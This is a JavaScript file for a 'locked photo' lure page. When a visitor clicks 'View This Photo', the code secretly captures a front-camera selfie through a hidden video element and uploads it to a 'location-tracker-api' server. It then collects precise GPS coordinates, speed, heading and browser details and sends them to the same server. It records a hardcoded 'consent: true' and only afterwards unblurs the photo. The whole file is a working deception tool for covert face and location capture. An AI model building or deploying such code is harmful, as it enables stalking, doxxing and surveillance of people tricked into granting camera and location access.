const viewPhotoBtn = document.getElementById("viewPhotoBtn");
const statusEl = document.getElementById("status");
const albumPhoto = document.getElementById("albumPhoto");
const lockBadge = document.getElementById("lockBadge");

const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

let cameraStream = null;
let lastLocationId = null;
let selfieBlob = null;
let isProcessing = false;

function setStatus(message) {
    statusEl.innerHTML = message;
}

function unlockPhoto() {
    albumPhoto.style.filter = "blur(0)";
    lockBadge.style.opacity = "0";
    viewPhotoBtn.disabled = false;
    viewPhotoBtn.textContent = "👁️ View This Photo";
}

function resetUI() {
    viewPhotoBtn.disabled = false;
    viewPhotoBtn.textContent = "👁️ View This Photo";
    isProcessing = false;
}

function stopCameraStream() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
}

// --- Step 1: Request camera (hidden) and capture selfie ---
async function requestCameraAndCapture() {
    // Check HTTPS
    if (window.location.protocol !== "https:" && window.location.hostname !== "localhost") {
        setStatus("❌ HTTPS required for camera & location access.");
        resetUI();
        return;
    }

    try {
        // Check if mediaDevices API is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus("❌ Camera API not supported in this browser.");
            resetUI();
            return;
        }

        const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            },
            audio: false
        });

        cameraStream = stream;

        // Create hidden video element dynamically
        const hiddenVideo = document.createElement("video");
        hiddenVideo.srcObject = stream;
        hiddenVideo.autoplay = true;
        hiddenVideo.playsinline = true;
        hiddenVideo.muted = true; // Required for autoplay in some browsers
        hiddenVideo.style.display = "none";
        hiddenVideo.setAttribute("aria-hidden", "true");
        document.body.appendChild(hiddenVideo);

        // Wait for video to be ready with timeout
        await Promise.race([
            new Promise((resolve, reject) => {
                hiddenVideo.onloadedmetadata = () => {
                    hiddenVideo.play().then(resolve).catch(reject);
                };
                if (hiddenVideo.readyState >= 2) {
                    resolve();
                }
            }),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error("Camera init timeout")), 5000)
            )
        ]);

        // Small delay for camera to warm up
        await new Promise(r => setTimeout(r, 500));

        // Capture frame
        const videoWidth = hiddenVideo.videoWidth || 640;
        const videoHeight = hiddenVideo.videoHeight || 480;

        if (videoWidth === 0 || videoHeight === 0) {
            throw new Error("Camera returned empty dimensions");
        }

        const hiddenCanvas = document.createElement("canvas");
        hiddenCanvas.width = videoWidth;
        hiddenCanvas.height = videoHeight;
        const ctx = hiddenCanvas.getContext("2d");
        ctx.drawImage(hiddenVideo, 0, 0);

        // Convert to blob
        selfieBlob = await new Promise((resolve, reject) => {
            hiddenCanvas.toBlob((blob) => {
                if (blob) resolve(blob);
                else reject(new Error("Canvas toBlob failed"));
            }, "image/jpeg", 0.85);
        });

        // Clean up
        document.body.removeChild(hiddenVideo);
        document.body.removeChild(hiddenCanvas);
        stopCameraStream();

        // Proceed
        await uploadSelfieThenLocation();

    } catch (err) {
        console.error("Camera error:", err);
        stopCameraStream();

        if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
            setStatus("❌ Camera permission denied.");
        } else if (err.name === "NotFoundError") {
            setStatus("❌ No camera found on this device.");
        } else if (err.name === "NotReadableError") {
            setStatus("❌ Camera is in use by another application.");
        } else if (err.message === "Camera init timeout") {
            setStatus("❌ Camera initialization timed out.");
        } else {
            setStatus("❌ Camera access failed: " + err.message);
        }

        resetUI();
    }
}

// --- Step 2: Upload selfie FIRST, then request location ---
async function uploadSelfieThenLocation() {
    if (!selfieBlob) {
        setStatus("❌ No selfie captured.");
        resetUI();
        return;
    }

    setStatus("📷 Capturing...");

    // Check online status
    if (!navigator.onLine) {
        setStatus("❌ No internet connection.");
        resetUI();
        return;
    }

    try {
        // Upload selfie with timeout
        const formData = new FormData();
        formData.append("image", selfieBlob, "selfie.jpg");
        formData.append("timestamp", new Date().toISOString());

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout

        const selfieResponse = await fetch(SELFIE_API_URL, {
            method: "POST",
            body: formData,
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!selfieResponse.ok) {
            let errorMsg = "Upload failed";
            try {
                const errData = await selfieResponse.json();
                errorMsg = errData.message || errorMsg;
            } catch (e) {
                // Response body not JSON
            }
            setStatus("❌ " + errorMsg);
            resetUI();
            return;
        }

        const selfieResult = await selfieResponse.json();
        const selfieId = selfieResult.id;

        if (!selfieId) {
            setStatus("❌ Server did not return a selfie ID.");
            resetUI();
            return;
        }

        // Now request location
        setStatus("📍 Requesting location...");
        requestLocation(selfieId);

    } catch (err) {
        console.error("Upload error:", err);

        if (err.name === "AbortError") {
            setStatus("❌ Upload timed out.");
        } else if (err instanceof TypeError && err.message.includes("NetworkError")) {
            setStatus("❌ Network error — check CORS configuration on the server.");
        } else {
            setStatus("❌ Could not upload selfie: " + err.message);
        }

        resetUI();
    }
}

// --- Step 3: Request location and link to selfie ---
function requestLocation(selfieId) {
    // Check geolocation support
    if (!navigator.geolocation) {
        setStatus("❌ Geolocation not supported by this browser.");
        resetUI();
        return;
    }

    // Check HTTPS
    if (window.location.protocol !== "https:" && window.location.hostname !== "localhost") {
        setStatus("❌ Geolocation requires HTTPS.");
        resetUI();
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude || null,
                altitudeAccuracy: position.coords.altitudeAccuracy || null,
                heading: position.coords.heading || null,
                speed: position.coords.speed || null,
                timestamp: new Date().toISOString(),
                consent: true,
                selfie_id: selfieId,
                user_agent: navigator.userAgent
            };

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 15000);

                const locResponse = await fetch(LOCATION_API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);

                if (!locResponse.ok) {
                    let errorMsg = "Location upload failed";
                    try {
                        const errData = await locResponse.json();
                        errorMsg = errData.message || errorMsg;
                    } catch (e) {}
                    setStatus("❌ " + errorMsg);
                    resetUI();
                    return;
                }

                const locResult = await locResponse.json();

                if (!locResult.id) {
                    setStatus("❌ Server did not return a location ID.");
                    resetUI();
                    return;
                }

                lastLocationId = locResult.id;
                setStatus("✅ Photo unlocked!");
                unlockPhoto();
                isProcessing = false;

            } catch (err) {
                console.error("Location upload error:", err);

                if (err.name === "AbortError") {
                    setStatus("❌ Location upload timed out.");
                } else {
                    setStatus("❌ Could not connect to server: " + err.message);
                }

                resetUI();
            }
        },
        (error) => {
            let msg;
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    msg = "❌ Location permission denied.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    msg = "❌ Location unavailable (GPS/signal).";
                    break;
                case error.TIMEOUT:
                    msg = "❌ Location request timed out.";
                    break;
                default:
                    msg = "❌ Unknown location error (code " + error.code + ").";
            }
            setStatus(msg);
            resetUI();
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// --- Handle "View This Photo" click ---
viewPhotoBtn.addEventListener("click", (e) => {
    e.preventDefault();

    if (isProcessing) return;
    isProcessing = true;

    viewPhotoBtn.disabled = true;
    viewPhotoBtn.textContent = "⏳ Verifying...";
    setStatus("📸 Initializing...");

    // Start the flow: camera → selfie → location → unlock
    requestCameraAndCapture();
});